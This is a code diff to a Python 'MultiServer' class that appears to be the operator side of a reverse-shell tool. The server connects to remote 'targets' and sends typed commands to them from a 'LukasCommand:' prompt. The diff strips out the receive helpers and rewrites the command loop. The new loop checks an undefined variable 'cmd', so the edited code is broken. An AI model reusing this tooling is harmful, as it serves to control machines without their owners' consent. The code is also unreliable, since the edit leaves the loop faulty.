@@ -215,46 +215,20 @@ class MultiServer(object):
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
 
-    def read_command_output(self, conn):
-        """ Read message length and unpack it into an integer
-        :param conn:
-        """
-        raw_msglen = self.recvall(conn, 4)
-        if not raw_msglen:
-            return None
-        msglen = struct.unpack('>I', raw_msglen)[0]
-        # Read the message data
-        return self.recvall(conn, msglen)
-
-    def recvall(self, conn, n):
-        """ Helper function to recv n bytes or return None if EOF is hit
-        :param n:
-        :param conn:
-        """
-        # TODO: this can be a static method
-        data = b''
-        while len(data) < n:
-            packet = conn.recv(n - len(data))
-            if not packet:
-                return None
-            data += packet
-        return data
 
     def send_target_commands(self, target, conn):   #HERE LUKAS_ALSTRUP
         """ Connect with remote target client 
         :param conn: 
         :param target: 
         """
-        conn.send(str.encode(" "))
-        cwd_bytes = self.read_command_output(conn)
-        cwd = str(cwd_bytes, "utf-8")
-        print(cwd, end="")
         while True:
-            #try:
             command = str(input("LukasCommand: "))
-            check_command(conn,command)
+            
             if cmd == 'quit':
                 break
+            else:
+                check_command(conn,command)
+
             """except Exception as e:
                 print("Connection was lost %s" %str(e))
                 break"""
